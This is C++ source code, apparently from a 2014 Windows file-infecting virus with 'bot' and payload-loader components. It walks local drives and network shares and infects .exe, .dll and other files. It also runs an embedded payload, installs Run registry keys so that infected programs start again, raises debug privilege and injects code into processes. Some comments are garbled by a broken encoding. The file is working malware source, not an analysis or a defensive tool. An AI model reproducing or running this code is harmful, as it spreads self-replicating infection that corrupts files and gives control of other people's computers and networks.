
// author: Pest
// copyright: coru.ws 2014

#include <Windows.h>
#include "common.h"
#include "file.h"
#include "dbg.h"
#include "infect.h"
#include "loader.h"
#include "payload32.h"
#include "loader32.h"
#include "find.h"
#include "inject.h"
#include "reg.h"
#include "shares.h"

char mtbot[] = "Global\\mtbot";


bool infected(wchar_t *fn, cmem *v){
	cmem a, c;

	if (is_file_protected(fn)){
		dbg(VERROR, L"File %s is protected", fn);
		return false;
	}

	if (!cfile::load(fn, a, MAX_SIZE_FILE)){
		dbg(VERROR, L"Can't open file %s", fn);
		return false;
	}

	int r = infect(a, *v, &c);
	if (!r){
		dbg(VERROR, L"Can't infect file %s", fn);
		return false;
	}

	if (r == 2){
		dbg(VINFO, L"File %s already infected", fn);
		return false;
	}

	delete_file(fn);
	if (!cfile::save(fn, c)){
		dbg(VERROR, L"Can't save infected %s", fn);
		return false;
	}

	dbg(VINFO, L"Target file %s infected", fn);

	return true;
}

DWORD _stdcall P(wchar_t *dir,DWORD attr, void *arg){
	cmem *b = (cmem *)arg;

	static wchar_t windir[MAX_PATH];
	static bool fwindir = false;
	if (attr&FILE_ATTRIBUTE_DIRECTORY)
	{
		if (!fwindir){
			fwindir = true;
			GetWindowsDirectoryW(windir, MAX_PATH);
		}

		if (_wcsicmp(dir, windir) == 0){
			return FIND_SKIP;
		}
		/*
		wchar_t *subdir = dir;
		wchar_t *p = wcsrchr(dir, L'\\');
		if (p) subdir = p+1;

		if (_wcsicmp(subdir, L"Program Files (x86)") == 0){
			return FIND_SKIP;
		}


		if (_wcsicmp(subdir, L"Program Files") == 0){
			return FIND_SKIP;
		}
		*/
	}



	if (!(attr&FILE_ATTRIBUTE_DIRECTORY))
		infected(dir, b);
	return true;
}


DWORD __stdcall thread_payload(void *arg){
	dbg(VINFO,"I'm payload");
	cmem a;
	a.push((BYTE*)payload32,sizeof(payload32));
	BYTE *p;
	DWORD size;
	if (loadlibrary_x32(a, p, size)){
		void *ep;
		if (get_entry_point32(p, size, ep)){
			typedef void(*F)();
			F f = (F)ep;
			f();
		}
	}
	ExitThread(0);
}


DWORD _stdcall autorun(wchar_t *dir,DWORD attr, void *arg){
	static wchar_t windir[MAX_PATH];
	static bool fwindir = false;
	if (attr&FILE_ATTRIBUTE_DIRECTORY)
	{

		if (!fwindir){
			fwindir = true;
			GetWindowsDirectoryW(windir, MAX_PATH);
		}

		if (_wcsicmp(dir, windir) == 0){
			return FIND_SKIP;
		}

	}
	cmem f;
	if (cfile::load(dir, f, MAX_SIZE_FILE)){
		if (check_pe(&f) && 
			check_infected(&f)){
			dbg(VINFO, L"Infected for autorun %s", dir);
			wchar_t value[MAX_PATH],name[MAX_PATH];
			_snwprintf(value, MAX_PATH, L"%s %s", dir, L"/mt");
			wchar_t *p = wcsrchr(dir, L'\\');
			if (!p) p = dir;
			else p++;
			wcsncpy(name, p, MAX_PATH);
			p = wcsrchr(name,L'.');
			if (p) p[0] = 0;
			if (!creg::set(HKEY_LOCAL_MACHINE, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", name, value)){
				creg::set(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", name, value);
			}
			return FIND_EXIT;
		}
	}
	return FIND_NEXT;
}

bool check_autorun(){
	bool r = false;
	wchar_t name[MAX_PATH];
	wchar_t value[MAX_PATH];
	HKEY hkey;
	if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_ALL_ACCESS, &hkey) == ERROR_SUCCESS){
		int i = 0;
		while (1){
			DWORD ln=MAX_PATH;
			DWORD ld = MAX_PATH;
			DWORD t;
			if (RegEnumValueW(hkey, i, name, &ln, 0, &t, (BYTE*)value, &ld) != ERROR_SUCCESS){
				break;
			}
			cmem f;
			if (cfile::load(value, f, MAX_SIZE_FILE)){
				if (check_pe(&f) && check_infected(&f)){
					r = true;
					break;
				}
			}			
			i++;
		}
		RegCloseKey(hkey);
	}
	if (r)
		return true;

	if (RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_ALL_ACCESS, &hkey) == ERROR_SUCCESS){
		int i = 0;
		while (1){
			DWORD ln = MAX_PATH;
			DWORD ld = MAX_PATH;
			DWORD t;
			if (RegEnumValueW(hkey, i, name, &ln, 0, &t, (BYTE*)value, &ld) != ERROR_SUCCESS){
				break;
			}
			cmem f;
			if (cfile::load(value, f, MAX_SIZE_FILE)){
				if (check_pe(&f) && check_infected(&f)){
					r = true;
					break;
				}
			}
			i++;
		}
		RegCloseKey(hkey);
	}
	if (r)
		return true;
	return false;
}

DWORD __stdcall thread_autorun(void *arg){
	bool r = false;
	Sleep(20000);
	while (1){
		if (!check_autorun()){
			wchar_t drive[MAX_PATH];
			GetWindowsDirectoryW(drive, MAX_PATH);
			drive[2] = 0;
			find_dir(drive, L"*.exe", autorun, 0);
		}
		Sleep(60000);
	}
	return 0;
}

bool shares(LPNETRESOURCEW lpnr, void *arg){
	switch (lpnr->dwDisplayType) {
	case (RESOURCEDISPLAYTYPE_SERVER) :
		find_dir(lpnr->lpRemoteName, L"*.*", P, arg);
		break;
	case (RESOURCEDISPLAYTYPE_SHARE) :
		find_dir(lpnr->lpRemoteName, L"*.*", P, arg);
		break;
	}

	return true;
}

void entry(DWORD magic,DECRYPT_ITEM *item){	
	if (magic==MAGIC_INJECT){
#if _DEBUG
		wchar_t name[MAX_PATH];
		GetModuleFileNameW(GetModuleHandleW(0), name, MAX_PATH);
		dbg(VINFO, L"I'm injected %s",name);
#endif
		//� �������� ��� ��� �����
		while (true){
			HANDLE hbot = CreateMutexA(0, TRUE, mtbot);
			if (!hbot){
				Sleep(1000);
				continue;
			}
			if (GetLastError() == ERROR_ALREADY_EXISTS){
				CloseHandle(hbot);
				Sleep(1000);
				continue;
			}
			break;
		}
		
		//�������� ���� ����� ����
#if _DEBUG
		dbg(VINFO, L"Run bot %s", name);
#endif
		//����� �������� ��������
		CreateThread(0, 0, thread_payload, 0, 0, 0);
		//������ � ����������
		CreateThread(0, 0, thread_autorun, item, 0, 0);
		//��������� ������
		cmem b;
		b.push(item+1, item->size);
		while (1){
			find_drive(L"*.exe", P, &b);
			find_drive(L"*.dll", P, &b);
			infect_netshares(shares, &b);
			find_drive(L"*.*", P, &b);
			dbg(VINFO, "Infect done");
			Sleep(60*60*1000);
		}
		
		ExitThread(0);
	}
	if (magic == MAGIC_SHELLCODE){ //������ ��������� ������
		dbg(VINFO, L"I'm copy beetle2 inside target file");
		setPrivilege(GetCurrentProcess(), SE_DEBUG_NAME, TRUE);
		cmem inj;
		inj.push(item, item->size + sizeof(DECRYPT_ITEM));
		inject(inj);
		ExitThread(0);
	}

	wchar_t fcur[MAX_PATH];
	GetModuleFileNameW(GetModuleHandleW(0), fcur, MAX_PATH);

	cmem a, b, c;
	if (!cfile::load(fcur, a)){
		dbg(VERROR, "Can't open current file");
		exit(0);
	}
	
	if (!cfile::load("..\\test\\notepad.exe", b)){
		dbg(VERROR, "Can't open target file");
		exit(0);
	}
	
	if (!infect(b, a, &c)){
		dbg(VERROR, "Can't infect target file");
		exit(0);
	}

	if (!cfile::save("..\\test\\notepad.inf.exe", c)){
		dbg(VERROR, "Can't save infected file");
		exit(0);
	}

	dbg(VINFO, "Done target file");
	exit(0);
}